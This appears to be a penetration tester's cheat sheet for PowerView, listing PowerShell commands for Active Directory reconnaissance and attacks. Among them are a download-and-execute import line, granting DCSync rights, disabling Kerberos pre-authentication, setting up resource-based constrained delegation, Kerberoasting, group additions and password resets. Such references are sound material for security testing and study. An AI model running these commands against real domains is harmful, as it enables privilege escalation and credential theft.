# [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

> Offensive PowerShell module for enumeration and exploitation of an Active Directory environment.

---

## Import PowerView

To use `PowerView`, you must first import it into the current PowerShell session.

To do this in a normal PowerShell prompt on the host:

```powershell
Import-Module -Name $PATH_TO_POWERVIEW.ps1
```

To import a remotely hosted PowerView:

```powershell
IEX (New-Object Net.Webclient).DownloadString($HTTP_URL_TO_POWERVIEW_SCRIPT); $POWERVIEW_COMMAND_HERE
```

Note `$POWERVIEW_COMMAND_HERE`. Remote imports only last for that line. Thus, all PowerView commands will need to be on the same line (separated by semicolons).

---

## Query a Foreign Domain

Requires network connectivity to the foreign domain's domain controller and a security context capable of issuing LDAP queries to that domain controller.

Use the `-Domain $DOMAIN_NAME` flag. Use the `-Server $FQDN_OR_IP` to specify the foreign domain's domain controller. Use th `-Credential` flag to specify an alternate credential from the current security context.

---

## Get-NetDomain

Gathers information about the domain, including forest name, domain controllers, and domain name. A more concise version of the ActiveDirectory module's *Get-ADDomain*.

```powershell
Get-NetDomain
```

---

## Get-NetDomainController

Lists all the domain controllers in the network.

```powershell
Get-NetDomainController
```

On Linux: [[pywerview#get-netdomaincontroller|pywerview's get-netdomaincontroller]].

---

## Get-NetForest

Gathers information on the forest, including all associated domains, the root domain, and the domain controllers for the root domain. Similar to the ActiveDirectory module's *Get-ADForest*.

```powershell
Get-NetForest
```

---

## Get-NetDomainTrust

Gathers information on the trusts in the domain, including direction, source, and target. A more concise version of the ActiveDirectory module's *Get-ADTrust*.

```powershell
Get-NetDomainTrust
```

---

## Get-DomainUser

Gathers information on the users in the domain. A more concise version of the ActiveDirectory module's *Get-ADUser*.

```powershell
Get-DomainUser | select cn
```

---

## Get-DomainGroup

```powershell
Get-DomainGroup
```

---

## Get-DomainComputer

Gathers information on the computers in the domain.

```powershell
Get-DomainComputer | select name, operatingsystem
```

On Linux: [[pywerview#get-netcomputer|pywerview's get-netcomputer]].

---

## Get-DomainOU

```powershell
Get-DomainOU
```

---

## Get-NetShare

Gathers information on the shares in the domain.

```powershell
Get-NetShare
```

---

## List group policy objects (GPOs)

```powershell
Get-NetGPO | select displayname, whenchanged
```

---

## List shares across the domain

```powershell
Invoke-ShareFinder
```

---

## Get Domain SID

```powershell
Get-DomainSID
```

---

## Gather Users who don't Require [[kerberos#Kerberos Pre-Authentication|Kerberos Pre-Authentication]]

```powershell
Get-DomainUser -KerberosPreauthNotRequired
```

---

## Disable a Principal's Pre-Authentication

```powershell
Set-DomainObject -Identity $USERNAME -XOR @{UserAccountControl=4194304}
```

You can check with:

```powershell
Get-DomainUser -Identity $USERNAME | ConvertFrom-UACValue
```

---

## Gather Users who have at least one [[service-principal-name|SPN]] Set

```powershell
Get-DomainUser -SPN
```

---

## Gather Computers & Users Configured with [[unconstrained-delegation|Unconstrained Delegation]]

Must be executed in the context of a domain user account.

```powershell
Get-DomainComputer -Unconstrained
Get-NetComputer -Unconstrained
```

```powershell
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

---

## Gather Computers & Users Configured with [[constrained-delegation|Constrained Delegation]]

Must be executed in the context of a domain user account.

```powershell
Get-DomainComputer -TrustedToAuth [-Properties msDs-AllowedToDelegateTo,samAccountName,dnsHostName]
Get-NetComputer -TrustedToAuth [-Properties msDs-AllowedToDelegateTo,samAccountName,dnsHostName]
```

```powershell
Get-DomainUser -TrustedToAuth [-Properties msDs-AllowedToDelegateTo,samAccountName]
Get-NetUser -TrustedToAuth [-Properties msDs-AllowedToDelegateTo,samAccountName]
```

---

## Return Users that **are not** Marked as "Sensitive and Not Allowed for Delegation"

Must be executed in the context of a domain user account.

```powershell
Get-DomainUser -AllowDelegation
Get-NetUser -AllowDelegation
```

---

## Return Users that **are** Marked as "Sensitive and Not Allowed for Delegation"

Must be executed in the context of a domain user account.

```powershell
Get-DomainUser -DisallowDelegation
Get-NetUser -DisallowDelegation
```

---

## Retrieve an Object's DACL

### Retrieve a User's DACL

```powershell
Get-DomainObjectAcl [-SamAccountName $SAM_ACCOUNT_NAME] -ResolveGUIDs [| ? {$_.ActiveDirectoryRights -eq "$PERMISSION"}]
```

- `$SAM_ACCOUNT_NAME` of the user account
- `$PERMISSION` is the permission to filter for
	- [[dacls-aces#Permissions of Interest|Here's some permissions of interest]]

### Retrieve a Group's DACL

You'll need the distinguished name of the group.

```powershell
Get-DomainGroup $GROUP_NAME | select DistinguishedName
```

Example distinguished name: `CN=Domain Admins,OU=Groups,DC=MARVEL,DC=test`.

Retrieve the group's DACL with the distinguished name.

```powershell
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "$DISTINGUISHED_NAME"[ -and $_.ActiveDirectoryRights -eq "$PERMISSION"]}
```

- `$PERMISSION` is the permission to filter for
	- [[dacls-aces#Permissions of Interest|Here's some permissions of interest]]

### Retrieve a Computer's DACL

Same procedure as [[powerview#Retrieve a User's DACL|retrieving a user's DACL]] except you use the `$SAM_ACCOUNT_NAME` of the computer.

### Convert SID To Object Name

This may come in handy, as many object's ACEs designate the subject by its SID.

```powershell
"$SID" | Convert-SidToName
```

```powershell
ConvertFrom-SID $SID
```

---

## Determine All Principals Who Can Execute a [[dcsync|DCSync]]

```powershell
Get-ObjectAcl -DistinguishedName "$DISTINGUISHED_NAME_OF_THE_DOMAIN" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

You'll probably need to [[powerview#Convert SID To Object Name|translate each of the resultant objects' SIDs into their actual names]].

---

## Add an ACE to a Principal's DACL

```powershell
Add-DomainObjectAcl -PrincipalIdentity "$PRINCIPAL" -TargetIdentity "$TARGET" -Rights $RIGHTS [-Credentials $CREDENTIALS] [-Verbose]
```

- `$PRINCIPAL` is the domain principal **subject** of the ACE
- `$TARGET` is the domain principal **object** of the ACE
	- One time for this to work, I had to specify the target's LDAP distinguished name, not just its SAM account name
- `$RIGHTS` are either `ResetPassword`, `WriteMembers`, `DCSync`, or `All`.
- `$CREDENTIALS` is an optional [[powershell#Create a Credential|PSCredential]] object of a domain principal authorized to add the ACE to the target principal's DACL

---

## Assign DCSync Privileges to a Principal

```powershell
Add-DomainObjectAcl -PrincipalIdentity $PRINCIPAL -TargetIdentity $DISTINGUISHED_NAME_OF_DOMAIN -Rights DCSync [-Credentials $CREDENTIALS] [-Verbose]
```

- `$PRINCIPAL` is the principal who you are adding DCSync privileges to
- `$CREDENTIALS` is a [[powershell#Create a Credential|PSCredential]] object of a domain principal authorized to add the ACE to the domain's ACL
	- Out of precaution, it's often wise to include this parameter, even if you're executing in the context of the same user whose credential you would pass in (remember HTB Forest)

---

## Configure [[resource-based-constrained-delegation|Resource-Based Constrained Delegation]] from `ComputerA` to `ComputerB`

`ComputerB` is specifying that `ComputerA` is allowed to delegate to it.

Requires `GenericAll`, `GenericWrite`, or `WriteDACL` permission to `ComputerB`.

```powershell
# Get ComputerA's SID
$ComputerASid = Get-DomainComputer ComputerA -Properties objectsid | Select -Expand objectsid

# Build the raw security descriptor with ComputerA as the principal
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerASid))"

# Get the raw bytes for the security descriptor
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Set the new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
Get-DomainComputer ComputerB | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# (Optional) Confirm security descriptor addition
$RawBytes = Get-DomainComputer ComputerB -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl
```

---

## Cleanup After [[resource-based-constrained-delegation|Resource-Based Constrained Delegation Attack]]

Clear the `msds-allowedtoactonbehalfofotheridentity` attribute from the target computer.

```powershell
Get-DomainComputer $TARGET | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
```

---

## Add a SPN To a Principal

```powershell
Set-DomainObject -Identity $SAM_ACCOUNT_NAME_OF_TARGET_PRINCIPAL -Set @{serviceprincipalname='$SPN'} [-Credential $CREDENTIAL]
```

- Example `$SPN`: `HOST/blahblah`
	- Doesn't have to be anything legitimate
- Example `$CREDENTIAL`: [[powershell#Create a Credential PSCredential Object|PowerShell PSCredential Object]]

---

## Kerberoast a Principal

```powershell
Invoke-Kerberoast -Identity $PRINCIPAL_TO_KERBEROAST
```

---

## Add a User to a Domain Group

```powershell
Add-DomainGroupMember -Identity $GROUP_NAME -Members $PRINCIPAL_TO_ADD [-Credential $CREDENTIAL]
```

---

## Check if a User is in a Domain Group

```powershell
Get-DomainGroupMember -Identity $GROUP_NAME [-Credential $CREDENTIAL] | ? {$_.MemberName -eq "$USERNAME"}
```

---

## Change a Domain User's Password

```powershell
Set-DomainUserPassword -Identity $DOMAIN_USER_TO_CHANGE -AccountPassword $PASSWORD [-Credential $CREDENTIAL]
```

- `$PASSWORD` is a `SecureString`
- `$CREDENTIAL` is a [[powershell#Create a Credential PSCredential Object|PSCredential]]

---

## Enumerate Internal & External Trusts of all Domains in the Current Forest

This enumeration method leverages the [[global-catalog|Global Catalog]] and as a result, only requires network traffic between the executing machine and the current domain's primary domain controller.

```powershell
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"
```

---

## Recursively Enumerate Trusts of all Domains of the Current Forest and all Transitive Domains

```powershell
Get-DomainTrustMapping
```

---

## List All or Retrieve a Specify Local Group on a Local or Remote Computer

```powershell
Get-NetLocalGroupMember [-ComputerName $FQDN_OR_IP_OF_COMPUTER] [-GroupName $GROUP_NAME] [-Credential $CREDENTIAL]
```

---

## Enumerate Foreign Group Membership

### List All Users Who are Members of the Current Domain and are in Groups of Foreign Domains

```powershell
Get-DomainForeignUser
```

### List All Users Who are Members of a Target Domain and are in Groups of Foreign Domains

```powershell
Get-DomainForeignUser -Domain $TARGET_DOMAIN
```

---

## List All GPOs that Modify Local Group Membership

```powershell
Get-DomainGPOLocalGroup [| select GPODisplayName, GroupName]
```

---

## List All Computers that have Domain Users or Domain Groups as Members of One of its Local Groups

```powershell
Get-DomainGPOUserLocalGroupMapping -LocalGroup $LOCAL_GROUP_NAME [| select ObjectName, GPODisplayName, ContainerName, ComputerName]
```

---

## List All Active Session on a Computer

```powershell
Get-NetSession -ComputerName $COMPUTER_NAME [| select CName, UserName]
```

- `CName` is the source IP address of the session

---

## List Active Sessions Across the Domain

Finds the sessions of users in the specified group (`Domain Admins`) by default. Queries every computer in the domain, so very loud.

```powershell
Find-DomainUserLocation
```

---

## List All Principals Capable of Creating New GPOs

```powershell
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,[DC=$SUBDOMAIN_NAME,]DC=$DOMAIN_NAME,DC=$TOP_LEVEL_DOMAIN_NAME" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

---

## List All Principals Capable of Linking GPOs to Particular OUs

```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
```

---

## List All Computers in a Particular OU

```powershell
Get-DomainComputer | ? { $_.DistinguishedName -match "OU=$OU_NAME" } | select DnsHostName
```

---

## List All Principals that can Modify Existing GPOs

```powershell
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "$DOMAIN_SID-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
```

- `$DOMAIN_SID` example: `S-1-5-21-3263068140-2042698922-2891547269`
	- Filtering on a SID with at least a 4-character RID is a good way of filtering out administrator accounts

---

## Resolve GPO ObjectDN to Display Name

```powershell
Get-DomainGPO -Name "$OBJECT_DN" -Properties DisplayName
```

- Example `$OBJECT_DN`: `{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}`
